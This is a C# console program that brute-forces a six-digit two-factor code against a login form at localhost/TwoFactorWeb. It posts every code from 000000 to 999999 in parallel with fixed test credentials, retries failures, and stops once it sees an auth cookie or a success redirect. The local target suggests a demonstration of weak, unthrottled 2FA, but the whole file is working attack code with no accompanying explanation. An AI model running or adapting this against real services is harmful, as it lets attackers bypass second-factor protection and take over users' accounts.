using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using System.Threading.Tasks;

namespace TwoFactorBruteForceAttempt
{
    class Program
    {
        static void Main(string[] args)
        {
            List<int> toRetry = new List<int>();

            for (int i = 0; i < 1000000; i++)
            {
                toRetry.Add(i);
            }

            do
            {
                List<int> toTry = new List<int>(toRetry);

                toRetry = new List<int>();

                Parallel.ForEach(toTry, new ParallelOptions { }, (i, state) =>
                {
                    string code = i.ToString(new string('0', 6));

                    try
                    {
                        HttpWebRequest req = WebRequest.Create("http://localhost/TwoFactorWeb/Account/LogOn") as HttpWebRequest;

                        req.Method = "POST";
                        req.ContentType = "application/x-www-form-urlencoded";

                        string requestContent = string.Format("UserName=test&Password=test12&TwoFactorCode={0}&RememberMe=false", code);

                        req.ContentLength = requestContent.Length;
                        req.AllowAutoRedirect = false;

                        using (StreamWriter w = new StreamWriter(req.GetRequestStream(), Encoding.ASCII))
                        {
                            w.Write(requestContent);
                        }

                        using (HttpWebResponse res = req.GetResponse() as HttpWebResponse)
                        {
                            string str = null;

                            using (StreamReader rdr = new StreamReader(res.GetResponseStream()))
                            {
                                str = rdr.ReadToEnd();
                            }

                            var authCookie = res.Cookies[".ASPXAUTH"];

                            if (authCookie != null)
                            {
                                Console.WriteLine("Found Two Factor Code: {0}", code);

                                state.Break();
                                return;
                            }

                            var redirectHeader = res.Headers["Location"];

                            if (redirectHeader == "/TwoFactorWeb/")
                            {
                                Console.WriteLine("Found Two Factor Code: {0}", code);

                                state.Break();
                                return;
                            }
                        }
                    }
                    catch
                    {
                        toRetry.Add(i);
                        System.Threading.Thread.Sleep(500);
                    }
                });
            } while (toRetry.Count > 0);
        }
    }
}
